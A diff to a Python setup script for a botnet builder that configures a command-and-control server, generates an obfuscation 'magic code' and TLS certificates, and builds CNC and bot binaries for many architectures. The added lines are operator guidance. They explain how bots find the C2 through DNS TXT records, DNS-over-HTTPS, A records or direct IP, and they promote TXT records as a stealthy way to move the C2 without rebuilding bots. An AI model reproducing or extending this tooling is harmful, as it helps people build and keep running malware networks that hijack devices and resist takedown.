@@ -98,6 +98,21 @@ def warning(msg: str):
     print(f"{Colors.BRIGHT_YELLOW}[!]{Colors.RESET} {Colors.YELLOW}{msg}{Colors.RESET}")
 
 
+def print_info_box(title: str, lines: list):
+    """Print a styled information box"""
+    width = 62
+    print(f"\n{Colors.BRIGHT_BLUE}┌{'─' * width}┐{Colors.RESET}")
+    print(f"{Colors.BRIGHT_BLUE}│{Colors.RESET} {Colors.BRIGHT_YELLOW}{title:<{width-1}}{Colors.RESET}{Colors.BRIGHT_BLUE}│{Colors.RESET}")
+    print(f"{Colors.BRIGHT_BLUE}├{'─' * width}┤{Colors.RESET}")
+    for line in lines:
+        # Handle empty lines
+        if not line:
+            print(f"{Colors.BRIGHT_BLUE}│{Colors.RESET}{' ' * width}{Colors.BRIGHT_BLUE}│{Colors.RESET}")
+        else:
+            print(f"{Colors.BRIGHT_BLUE}│{Colors.RESET} {line:<{width-1}}{Colors.BRIGHT_BLUE}│{Colors.RESET}")
+    print(f"{Colors.BRIGHT_BLUE}└{'─' * width}┘{Colors.RESET}\n")
+
+
 def prompt(msg: str, default: str = None) -> str:
     """Get user input with styled prompt"""
     if default:
@@ -518,21 +533,31 @@ def get_current_config(bot_path: str, cnc_path: str) -> dict:
 
 def print_menu():
     """Print the main menu"""
-    print(f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════╗{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}              {Colors.BRIGHT_YELLOW}Select Setup Mode{Colors.RESET}                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}╠══════════════════════════════════════════════════════════╣{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} Full Setup                                        {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}New C2 address, magic code, certs, everything{Colors.RESET}    {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Use for: Fresh install or complete rebuild{Colors.RESET}       {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} C2 URL Update Only                               {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Change C2 domain/IP, keep magic code & certs{Colors.RESET}     {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Use for: Server migration, domain change{Colors.RESET}          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_RED}[0]{Colors.RESET} Exit                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
-    print(f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
+    print(f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════════╗{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                 {Colors.BRIGHT_YELLOW}Select Setup Mode{Colors.RESET}                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}╠══════════════════════════════════════════════════════════════╣{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} {Colors.BRIGHT_WHITE}Full Setup{Colors.RESET}                                           {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} New C2 address (IP or domain)                     {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Generate new magic code & protocol version        {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Generate new TLS certificates                     {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}└─{Colors.RESET} Build CNC server & bot binaries                   {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Fresh install, new campaign{Colors.RESET}                {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} {Colors.BRIGHT_WHITE}C2 URL Update Only{Colors.RESET}                                   {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}├─{Colors.RESET} Change C2 domain or IP address                    {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}├─{Colors.RESET} Keep existing magic code & certificates           {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.YELLOW}└─{Colors.RESET} Rebuild bot binaries only                         {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Server migration, domain change{Colors.RESET}            {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_RED}[0]{Colors.RESET} Exit                                                  {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
+    
+    # Print quick feature summary
+    print(f"\n{Colors.DIM}  📡 Supports: Direct IP, Domain (A record), or TXT record C2{Colors.RESET}")
+    print(f"{Colors.DIM}  🔒 Bot→C2 encrypted via TLS 1.3 on port 443{Colors.RESET}")
+    print(f"{Colors.DIM}  🏗️  Builds for 14 architectures (x86, ARM, MIPS, etc.){Colors.RESET}\n")
     
     choice = prompt("Select option", "1")
     return choice
@@ -545,16 +570,58 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     # Step 1: C2 Address
     print_step(1, 5, "C2 Server Configuration")
 
-    c2_ip = prompt("Enter C2 server IP/domain", "127.0.0.1")
+    # Print comprehensive DNS resolution info
+    print_info_box("📡 C2 Resolution - How Bots Find Your Server", [
+        f"{Colors.BRIGHT_WHITE}The bot uses a multi-method resolution system:{Colors.RESET}",
+        "",
+        f"{Colors.BRIGHT_GREEN}Resolution Order (automatic fallback):{Colors.RESET}",
+        f"  {Colors.BRIGHT_CYAN}1.{Colors.RESET} DNS TXT Record  → Checks for TXT record on domain",
+        f"  {Colors.BRIGHT_CYAN}2.{Colors.RESET} DoH TXT Lookup  → Cloudflare/Google DNS-over-HTTPS",
+        f"  {Colors.BRIGHT_CYAN}3.{Colors.RESET} A Record        → Falls back to standard DNS A record",
+        f"  {Colors.BRIGHT_CYAN}4.{Colors.RESET} Direct IP       → Uses the value as-is if IP:port",
+        "",
+        f"{Colors.BRIGHT_YELLOW}You can enter:{Colors.RESET}",
+        f"  • {Colors.WHITE}Direct IP{Colors.RESET}      → 192.168.1.100 (simplest)",
+        f"  • {Colors.WHITE}Domain name{Colors.RESET}    → c2.example.com (uses A record)",
+        f"  • {Colors.WHITE}TXT domain{Colors.RESET}     → lookup.example.com (advanced)",
+    ])
+
+    print_info_box("🔧 DNS Record Setup Guide", [
+        f"{Colors.BRIGHT_GREEN}Option A: Direct IP (No DNS needed){Colors.RESET}",
+        f"  Just enter your server IP. Bots connect directly.",
+        "",
+        f"{Colors.BRIGHT_GREEN}Option B: A Record (Standard DNS){Colors.RESET}",
+        f"  Create DNS A record: c2.example.com → YOUR_IP",
+        f"  Enter: c2.example.com",
+        "",
+        f"{Colors.BRIGHT_GREEN}Option C: TXT Record (Stealth/Flexible){Colors.RESET}",
+        f"  Create DNS TXT record with one of these formats:",
+        f"    {Colors.BRIGHT_CYAN}c2=IP:PORT{Colors.RESET}     → c2=192.168.1.100:443",
+        f"    {Colors.BRIGHT_CYAN}ip=IP:PORT{Colors.RESET}     → ip=10.0.0.1:443",
+        f"    {Colors.BRIGHT_CYAN}IP:PORT{Colors.RESET}        → 192.168.1.100:443 (raw)",
+        f"    {Colors.BRIGHT_CYAN}IP{Colors.RESET}             → 192.168.1.100 (auto :443)",
+        "",
+        f"{Colors.DIM}TXT records let you change C2 IP without rebuilding bots!{Colors.RESET}",
+    ])
+
+    c2_ip = prompt("Enter C2 server IP or domain", "127.0.0.1")
     c2_address = f"{c2_ip}:443"
     config["c2_address"] = c2_address
 
-    admin_port = prompt("Enter admin server port", "420")
+    admin_port = prompt("Enter admin CLI port", "420")
     config["admin_port"] = admin_port
 
+    print()
     success(f"C2 configured: {c2_address}")
     success(f"Admin port: {admin_port}")
     info("Bot connection port is fixed at 443 (TLS)")
+    
+    # Show what DNS records to create if using domain
+    if not c2_ip.replace('.', '').isdigit():  # Not a pure IP
+        print()
+        warning("Since you're using a domain, ensure DNS is configured:")
+        print(f"  {Colors.CYAN}For A record:{Colors.RESET} {c2_ip} → YOUR_SERVER_IP")
+        print(f"  {Colors.CYAN}For TXT record:{Colors.RESET} {c2_ip} → \"c2=YOUR_SERVER_IP:443\"")
 
     # Step 2: Security Tokens
     print_step(2, 5, "Security Token Generation")
@@ -679,6 +746,34 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     # Step 1: New C2 Address
     print_step(1, 2, "New C2 Address")
 
+    # Print DNS resolution info
+    print_info_box("📡 C2 Resolution - How Bots Find Your Server", [
+        f"{Colors.BRIGHT_WHITE}The bot uses a multi-method resolution system:{Colors.RESET}",
+        "",
+        f"{Colors.BRIGHT_GREEN}Resolution Order (automatic fallback):{Colors.RESET}",
+        f"  {Colors.BRIGHT_CYAN}1.{Colors.RESET} DNS TXT Record  → Checks for TXT record on domain",
+        f"  {Colors.BRIGHT_CYAN}2.{Colors.RESET} DoH TXT Lookup  → Cloudflare/Google DNS-over-HTTPS",
+        f"  {Colors.BRIGHT_CYAN}3.{Colors.RESET} A Record        → Falls back to standard DNS A record",
+        f"  {Colors.BRIGHT_CYAN}4.{Colors.RESET} Direct IP       → Uses the value as-is if IP:port",
+        "",
+        f"{Colors.BRIGHT_YELLOW}You can enter:{Colors.RESET}",
+        f"  • {Colors.WHITE}Direct IP{Colors.RESET}      → 192.168.1.100",
+        f"  • {Colors.WHITE}Domain name{Colors.RESET}    → c2.example.com",
+    ])
+
+    print_info_box("💡 Pro Tip: TXT Records for Easy Migration", [
+        f"If you use a domain with TXT records, you can change",
+        f"your C2 IP just by updating the DNS TXT record!",
+        "",
+        f"{Colors.BRIGHT_GREEN}TXT Record Formats:{Colors.RESET}",
+        f"  {Colors.BRIGHT_CYAN}c2=IP:PORT{Colors.RESET}     → c2=192.168.1.100:443",
+        f"  {Colors.BRIGHT_CYAN}ip=IP:PORT{Colors.RESET}     → ip=10.0.0.1:443",
+        f"  {Colors.BRIGHT_CYAN}IP:PORT{Colors.RESET}        → 192.168.1.100:443 (raw)",
+        f"  {Colors.BRIGHT_CYAN}IP{Colors.RESET}             → 192.168.1.100 (auto :443)",
+        "",
+        f"{Colors.DIM}Bots will auto-discover new IP without rebuild!{Colors.RESET}",
+    ])
+
     c2_ip = prompt("Enter NEW C2 server IP/domain")
     if not c2_ip:
         error("C2 address is required!")
@@ -688,6 +783,13 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     config["c2_address"] = c2_address
 
     success(f"New C2 configured: {c2_address}")
+    
+    # Show what DNS records to create if using domain
+    if not c2_ip.replace('.', '').isdigit():  # Not a pure IP
+        print()
+        warning("Since you're using a domain, ensure DNS is configured:")
+        print(f"  {Colors.CYAN}For A record:{Colors.RESET} {c2_ip} → YOUR_SERVER_IP")
+        print(f"  {Colors.CYAN}For TXT record:{Colors.RESET} {c2_ip} → \"c2=YOUR_SERVER_IP:443\"")
     
     # Obfuscate with existing crypt_seed
     info("Applying obfuscation with existing crypt seed...")
